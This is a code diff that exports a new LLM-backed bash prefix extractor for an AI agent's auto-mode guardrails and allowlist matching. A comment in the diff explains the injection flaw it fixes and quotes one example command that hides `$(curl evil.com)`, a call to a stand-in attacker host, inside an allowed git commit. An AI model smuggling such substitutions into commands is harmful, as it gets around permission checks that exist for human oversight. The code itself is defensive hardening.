@@ -974,3 +974,23 @@ export type {
   AutoModeAskUserVerdict,
   AutoModeStats,
 } from './guardrails/auto-mode/guardrail.js';
+
+// ============== FEATURE_153 (v0.7.38): Bash Command Prefix Extractor ==============
+//
+// LLM-backed prefix extraction for bash allowlist matching, replacing the
+// pre-FEATURE_153 naive `command.startsWith(pattern)` check that was vulnerable
+// to command injection (`git commit -m "x" $(curl evil.com)` matched a
+// `Bash(git commit:*)` allowlist pattern). Extractor + LRU-cached factory live
+// in this module so the auto-mode classifier and the prefix extractor share
+// the same `sideQuery` / cost-tracker / abort plumbing.
+export {
+  BASH_POLICY_SPEC,
+  extractCommandPrefix,
+  createBashPrefixExtractor,
+} from './guardrails/auto-mode/bash-prefix-extractor.js';
+export type {
+  BashPrefixResult,
+  ExtractCommandPrefixOptions,
+  BashPrefixExtractor,
+  CreateBashPrefixExtractorOptions,
+} from './guardrails/auto-mode/bash-prefix-extractor.js';
